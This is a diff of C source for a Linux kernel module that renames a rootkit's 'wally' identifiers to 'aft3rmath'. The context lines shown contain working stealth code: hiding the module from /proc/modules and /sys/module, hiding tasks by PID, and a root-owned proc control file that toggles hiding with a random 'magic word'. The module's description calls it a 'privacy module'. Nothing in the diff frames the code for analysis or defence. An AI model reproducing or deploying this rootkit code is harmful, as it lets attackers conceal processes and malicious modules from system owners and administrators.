@@ -35,18 +35,18 @@
 #endif
 
 extern void hide_task_by_pid(pid_t pid);
-extern void wally_list_saved_tasks(void);
-extern void wally_data_cleanup(void);
+extern void aft3rmath_list_saved_tasks(void);
+extern void aft3rmath_data_cleanup(void);
 
-static struct proc_dir_entry *WallyProcFileEntry;
+static struct proc_dir_entry *aft3rmathProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
 static char *magic_word;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,4,0)
-#pragma message "!! Warning: Unsupported kernel version GOOD LUCK !!"
+#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
 #endif
 
-#define WALLY_DECLARE_MOD()                                           \
+#define AFT3RMATH_DECLARE_MOD()                                           \
     MODULE_LICENSE("GPL");                                            \
     MODULE_AUTHOR("Carlos Carvalho");                                 \
     MODULE_DESCRIPTION("privacy module for paranoid people");
@@ -152,7 +152,7 @@ error_out:
  * Remove the module entries
  * in /proc/modules and /sys/module/<MODNAME>
  * Also backup references needed for
- * wally_unhide_mod()
+ * aft3rmath_unhide_mod()
  */
 struct rmmod_controller {
     struct kobject *parent;
@@ -161,7 +161,7 @@ struct rmmod_controller {
 static struct rmmod_controller rmmod_ctrl;
 static DEFINE_MUTEX(generic_mutex);
 
-static void wally_hide_mod(void) {
+static void aft3rmath_hide_mod(void) {
     if (NULL != mod_list)
         return;
     /*
@@ -201,7 +201,7 @@ static void wally_hide_mod(void) {
  * After this function is called the best next
  * thing to do is to rmmod the module.
  */
-static void wally_unhide_mod(void) {
+static void aft3rmath_unhide_mod(void) {
     int err;
     struct kobject *kobj;
 
@@ -266,11 +266,11 @@ out_put_kobj:
     kobject_put(&(lkmmod.this_mod->mkobj.kobj));
     mod_list = NULL;
 }
-WALLY_DECLARE_MOD();
+AFT3RMATH_DECLARE_MOD();
 
 static char* get_unhide_magic_word(void) {
     if(!magic_word)
-        magic_word = wally_random_bytes(MAX_MAGIC_WORD_SIZE);
+        magic_word = aft3rmath_random_bytes(MAX_MAGIC_WORD_SIZE);
 
     /* magic_word must be freed later */
     return magic_word;
@@ -315,12 +315,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                         "Your module \'unhide\' magic word is: '%s'\n", magic_word);
             }
             op_lock = 1;
-            wally_hide_mod();
+            aft3rmath_hide_mod();
         } else if(!strcmp(buf, magic_word) && op_lock) {
             op_lock = 0;
-            wally_unhide_mod();
+            aft3rmath_unhide_mod();
         } else if(!strcmp(buf, "list"))
-            wally_list_saved_tasks();
+            aft3rmath_list_saved_tasks();
     }
 leave:
     return size;
@@ -340,16 +340,16 @@ static const struct file_operations proc_file_fops = {
 };
 
 static void do_remove_proc(void) {
-    if(WallyProcFileEntry) {
+    if(aft3rmathProcFileEntry) {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
         remove_proc_entry(PROCNAME, NULL);
 #else
-        proc_remove(WallyProcFileEntry);
+        proc_remove(aft3rmathProcFileEntry);
 #endif
     }
 }
 
-static int __init wally_init(void) {
+static int __init aft3rmath_init(void) {
     int lock = 0;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
     kuid_t kuid;
@@ -365,11 +365,11 @@ static int __init wally_init(void) {
 
 
 try_reload:
-    WallyProcFileEntry = proc_create(PROCNAME, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
-    if(lock && !WallyProcFileEntry)
+    aft3rmathProcFileEntry = proc_create(PROCNAME, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
+    if(lock && !aft3rmathProcFileEntry)
         goto proc_file_error;
     if(!lock) {
-        if(!WallyProcFileEntry) {
+        if(!aft3rmathProcFileEntry) {
             lock = 1;
             do_remove_proc();
             goto try_reload;
@@ -378,17 +378,17 @@ try_reload:
 
     /* set proc file maximum size & user as root */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
-    WallyProcFileEntry->size = MAX_PROCFS_SIZE;
-    WallyProcFileEntry->uid = 0;
-    WallyProcFileEntry->gid = 0;
+    aft3rmathProcFileEntry->size = MAX_PROCFS_SIZE;
+    aft3rmathProcFileEntry->uid = 0;
+    aft3rmathProcFileEntry->gid = 0;
 #else
-    proc_set_size(WallyProcFileEntry, MAX_PROCFS_SIZE);
+    proc_set_size(aft3rmathProcFileEntry, MAX_PROCFS_SIZE);
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
     kuid.val = 0;
     kgid.val = 0;
-    proc_set_user(WallyProcFileEntry, kuid, kgid);
+    proc_set_user(aft3rmathProcFileEntry, kuid, kgid);
 #else
-    proc_set_user(WallyProcFileEntry, 0, 0);
+    proc_set_user(aft3rmathProcFileEntry, 0, 0);
 #endif
 #endif
 
@@ -406,13 +406,13 @@ leave:
     return 0;
 }
 
-static void __exit wally_cleanup(void) {
+static void __exit aft3rmath_cleanup(void) {
     if(magic_word != NULL)
         kfree(magic_word);
-    wally_data_cleanup();
+    aft3rmath_data_cleanup();
     do_remove_proc();
-    printk(KERN_INFO "wally unloaded.\n");
+    printk(KERN_INFO "aft3rmath unloaded.\n");
 }
 
-module_init(wally_init);
-module_exit(wally_cleanup);
+module_init(aft3rmath_init);
+module_exit(aft3rmath_cleanup);
